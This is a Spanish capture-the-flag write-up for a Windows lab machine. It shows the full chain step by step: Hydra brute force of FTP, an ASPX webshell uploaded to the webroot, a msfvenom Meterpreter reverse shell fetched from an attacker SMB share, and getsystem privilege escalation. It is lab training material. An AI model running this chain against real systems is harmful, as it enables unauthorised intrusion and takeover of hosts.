# 🖥️ Writeup - Cocido Andaluz 

**Plataforma:** The Hackers Labs  
**Sistema Operativo:** Windows  

> **Tags:** `Windows` `FTP` `Hydra` `File Upload` `ASPX Webshell` `RCE` `Metasploit` `Impacket` `SMB Delivery`

# INSTALACIÓN

Descargamos el archivo `zip` que contiene la `.ova` de la máquina Cocido Andaluz, lo extraemos y la importamos en VirtualBox.

Configuramos la interfaz de red de la máquina Cocido Andaluz y la iniciamos junto a nuestra máquina atacante.

# RECONOCIMIENTO DE HOSTS

En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH      
 10.0.4.38       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
 ```

Identificamos con seguridad que la `IP` de la víctima es `10.0.4.38`.

# ESCANEO DE PUERTOS    

A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.38
``` 

```bash
nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.38
```

Info:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 22:56 +0100
Nmap scan report for 10.0.4.38
Host is up (0.00020s latency).

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
80/tcp  open  http          Microsoft IIS httpd 7.0
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.0
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:9A:E7:06 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-11T21:56:58
|_  start_date: 2026-01-11T21:43:25
|_nbstat: NetBIOS name: WIN-JG67MIHZH2X, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:9a:e7:06 (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```

Identificamos que los puertos `21`, `80` y `445` están abiertos.

Accedemos al servicio `HTTP` del puerto `80` y encontramos la página por defecto de `Apache2`.

Realizamos `fuzzing` de directorios, pero no encontramos nada relevante.

Intentamos acceder al servicio `FTP` (puerto 21) como `anonymous`, pero no está habilitado.

# FUERZA BRUTA

Procedemos a realizar un ataque de fuerza bruta contra el servicio `FTP` utilizando `Hydra`.

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ftp://10.0.4.38 -t 50
```

Info:
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-11 23:06:08
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 43048882131570 login tries (l:8295455/p:5189454), ~860977642632 tries per task
[DATA] attacking ftp://10.0.4.38:21/
[21][ftp] host: 10.0.4.38   login: info   password: PolniyPizdec0211
```

Encontramos credenciales válidas para el usuario `info` : `PolniyPizdec0211`.

Accedemos por FTP.

```bash 
ftp info@10.0.4.38
```

Una vez dentro, comprobamos que el directorio raíz del `FTP` corresponde al `webroot` del servicio HTTP del puerto `80`.

```
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
226 Transfer complete.
```

# RCE

Vamos a subir una `webshell ASPX` a través del `FTP` para poder inyectar comandos desde el navegador.

```
ftp> put cmd.aspx 
local: cmd.aspx remote: cmd.aspx
227 Entering Passive Mode (10,0,4,38,192,44).
125 Data connection already open; Transfer starting.
100% |*********************************|  1442       31.25 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (31.46 KiB/s)
```

Una vez subida, accedemos a la `webshell` vía navegador.

```
http://10.0.4.38/cmd.aspx
```

![alt text](../../images/aspx.png)

Como vemos en la captura, ya tenemos ejecución remota de comandos (`RCE`).

El siguiente paso es obtener acceso inicial a la máquina aprovechando esta ejecución.

Para ello, primero generamos un payload con `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.4.12 LPORT=443 -f exe -o met.exe
```

Ahora levantamos un servidor `SMB` en nuestro directorio actual, nombrando al recurso compartido como `share`.

```bash
sudo impacket-smbserver share .
```

Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Configuramos el `listener` en `msfconsole`.

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.4.12
set LPORT 443
run
```

A continuación, desde la `webshell ASPX`, llamamos a `met.exe` utilizando la ruta UNC.

```bash
\\10.0.4.12\share\met.exe 
```

Info:
``` 
[*] Started reverse TCP handler on 10.0.4.12:443 
[*] Sending stage (188998 bytes) to 10.0.4.38
[*] Meterpreter session 1 opened (10.0.4.12:443 -> 10.0.4.38:49209) at 2026-01-12 00:04:55 +0100

meterpreter > getuid
Server username: NT AUTHORITY\Servicio de red
meterpreter >
```

Obtenemos exitosamente la sesión de `Meterpreter`. Como vemos, aún no tenemos los máximos privilegios.

# ESCALADA DE PRIVILEGIOS

Intentamos un `getsystem` y ¡funciona! 

```
meterpreter > getsystem
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

Ya tenemos privilegios máximos (SYSTEM).